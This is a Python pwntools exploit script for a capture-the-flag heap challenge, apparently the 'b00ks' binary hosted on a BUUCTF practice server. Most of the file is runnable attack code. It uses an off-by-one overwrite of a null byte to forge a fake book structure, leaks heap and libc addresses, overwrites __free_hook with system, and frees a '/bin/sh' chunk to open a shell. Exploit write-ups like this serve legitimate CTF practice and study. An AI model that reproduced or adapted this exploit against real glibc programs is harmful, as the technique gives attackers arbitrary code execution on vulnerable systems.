from pwn import *
context.os = 'linux'
context.arch = 'amd64'
# context.log_level = 'debug'

# .data段可写 + off-by-one
p = remote('node4.buuoj.cn', 27834)
libc = ELF('../libcs/ubuntu16/x64/libc-2.23.so')
# enter user name
p.sendlineafter(b'Enter author name: ', b'a'*0x20)


def cmd(command: int):
    p.recvuntil(b'> ')
    p.sendline(str(command).encode())


def addBook(nameSize: int, name: bytes, descSize: int, desc: bytes):
    cmd(1)
    p.sendlineafter(b'Enter book name size: ', str(nameSize).encode())
    p.sendlineafter(b'Enter book name (Max 32 chars): ', name)
    p.sendlineafter(b'Enter book description size: ', str(descSize).encode())
    p.sendlineafter(b'Enter book description: ', desc)


def deleteBook(index: int):
    cmd(2)
    p.sendlineafter(b'Enter the book id you want to delete: ',
                    str(index).encode())


def editBook(index: int, newDesc: bytes):
    cmd(3)
    p.sendlineafter(b'Enter the book id you want to edit: ',
                    str(index).encode())
    p.sendlineafter(b'Enter new book description: ', newDesc)


def showBooks(index: int):
    cmd(4)
    p.recvuntil(('ID: {}'.format(index)).encode())
    p.recvuntil(b'Name: ')
    book_name = p.recvline(keepends=False)
    p.recvuntil(b'Description: ')
    book_desc = p.recvline(keepends=False)
    p.recvuntil(b'Author: ')
    book_author = p.recvline(keepends=False)
    return [book_name, book_desc, book_author]


def changeUser(userName: bytes):
    cmd(5)
    p.sendlineafter(b'Enter author name: ', userName)


def exp():
    addBook(120, b'book1', 200, b'desc1')  # id 1
    book1_name, book1_desc, author = showBooks(1)
    book1_addr = u64(author[32: 32 + 6].ljust(8, b"\x00"))
    # showBooks(1)
    # p.recvuntil(b'Author: ' + b'a'*0x20)
    # book1_addr = u64(p.recv(6).ljust(8, b'\x00'))
    p.success("book1 addr: {}".format(hex(book1_addr)))

    fake_book = b"a" * 0x60 + p64(book1_addr + 0x38) + \
        p64(book1_addr + 0x40) + p64(0xffff)
    editBook(1, fake_book)
    changeUser(b"a" * 32) # 最低字节改为\x00
    fake_name, fake_desc, author = showBooks(1)

    # addBook(1000000, b"book2", 1000000, b"description2")
    # book2_name_addr = u64(fake_name.ljust(8, b"\x00"))
    # book2_desc_addr = u64(fake_desc.ljust(8, b"\x00"))
    # # log.info("book2_name_addr: " + str(book2_name_addr))
    # # log.info("book2_desc_addr: " + str(book2_desc_addr))

    # libc_offset = 0x7ffff7cf3010 - 0x00007ffff7de8000
    # libc_addr = book2_name_addr - libc_offset
    # # log.info("libc_addr: " + libc_addr)

    # free_hook_addr = libc_addr + libc.symbols["__free_hook"]
    # system_addr = libc_addr + libc.symbols["system"]
    # bin_sh_addr = libc_addr + next(libc.search(b"/bin/sh"))

    # editBook(1, p64(bin_sh_addr) + p64(free_hook_addr))
    # editBook(2, p64(system_addr))

    # deleteBook(2)
    p.interactive()

# 看懂不难，但是能够想到这种方法感觉还是需要经验的
def exp2():
    addBook(0x90, b'book1', 0x90, b'desc1')  # id 1
    book1_name, book1_desc, author = showBooks(1)
    book1_addr = u64(author[32: 32 + 6].ljust(8, b"\x00"))
    book2_addr = book1_addr + 0x30
    addBook(0x80, b'cccc', 0x20, b'dddd') # id 2
    addBook(0x20, b'/bin/sh\x00', 0x20, b'ffff') # id 3
    fake_book = b'a'*0x40 + p64(1) + p64(book2_addr) + p64(book2_addr + 0x160) + p64(0x20) # 0x40 调试得到
    editBook(1, fake_book)

    changeUser(b'a'*0x20) # change id1 to 0x....00 fake book on book1
    deleteBook(2)
    book_name, desc, author = showBooks(1)
    libc_base = u64(book_name + b'\x00\x00') - 0x58 - 0x10 - libc.sym['__malloc_hook']
    free_hook = libc_base + libc.sym['__free_hook']
    # one_gadget = libc_base + 0x4526a
    system = libc_base + libc.sym['system']
    # bin_sh = libc_base + next(libc.search(b'/bin/sh'))

    editBook(1, p64(free_hook)+p64(0x10)) # 设置下一步的修改目标地址为free_hook，description size为0x10
    editBook(3, p64(system))
    deleteBook(3)

    p.interactive()

if __name__ == '__main__':
    exp2()
